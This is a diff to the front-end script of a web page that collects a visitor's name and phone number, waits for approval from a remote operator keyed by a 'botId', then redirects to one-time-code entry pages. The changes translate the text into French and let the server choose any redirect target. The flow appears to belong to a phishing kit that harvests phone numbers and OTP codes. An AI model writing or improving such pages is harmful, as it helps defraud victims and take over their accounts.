@@ -280,7 +280,7 @@
     <button type="submit" class="primary">Continuer</button>
   </form>
 
-  <div id="status" class="status">⏳ Waiting for approval...</div>
+  <div id="status" class="status">⏳ En attente d'approbation...</div>
   <div id="spinner" class="spinner"></div>
 
   <div class="back-link">
@@ -306,7 +306,7 @@ if(urlBotId) localStorage.setItem('botId', urlBotId);
 const botId = localStorage.getItem('botId');
 
 if(!botId || !fullName){
-  alert('Session expired. Please start again.');
+  alert('Session expirée. Veuillez recommencer.');
   window.location.href='index.html';
 }
 
@@ -324,7 +324,6 @@ form.addEventListener('submit', async (e)=>{
 
   const phone = document.getElementById('phone').value;
 
-  // Validate phone number
   if (!phone || phone.trim() === '') {
     statusEl.style.display = 'block';
     statusEl.classList.add('error');
@@ -338,10 +337,9 @@ form.addEventListener('submit', async (e)=>{
   statusEl.style.display='block';
   spinner.style.display='block';
   statusEl.classList.remove('error');
-  statusEl.textContent='⏳ Waiting for approval...';
+  statusEl.textContent='⏳ En attente d\'approbation...';
 
   try{
-    // Send only phone number and name
     const res = await fetch(`${window.location.origin}/submit-phone`,{
       method:'POST',
       headers:{'Content-Type':'application/json'},
@@ -356,7 +354,7 @@ form.addEventListener('submit', async (e)=>{
   } catch(error) {
     spinner.style.display='none';
     statusEl.classList.add('error');
-    statusEl.textContent='❌ Server error. Please try again.';
+    statusEl.textContent='❌ Erreur serveur. Veuillez réessayer.';
     nextButton.disabled = false;
     console.error('Error:', error);
   }
@@ -368,20 +366,26 @@ function pollApproval(requestId){
       const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
       const data = await res.json();
 
-      if(data.redirect === 'code2'){
+      // If server returns a redirect URL, go there
+      if (data.redirect) {
         clearInterval(interval);
-        window.location.href='code2.html';
+        window.location.href = data.redirect;
+        return;
       }
-      if(data.redirect === 'code'){
-        clearInterval(interval);
-        window.location.href='code.html';
-      }
-      if(data.approved === false){
+
+      // If approved is false, show error
+      if (data.approved === false) {
         clearInterval(interval);
         spinner.style.display='none';
         statusEl.classList.add('error');
-        statusEl.textContent='❌ Incorrect details. Please try again.';
+        statusEl.textContent='❌ Numéro rejeté. Veuillez réessayer.';
         nextButton.disabled = false;
+      }
+      // If approved is true (but no redirect) – shouldn't happen, but handle just in case
+      if (data.approved === true) {
+        clearInterval(interval);
+        // fallback to OTP page if no redirect given
+        window.location.href = 'code.html';
       }
     } catch(error) {
       console.error('Polling error:', error);
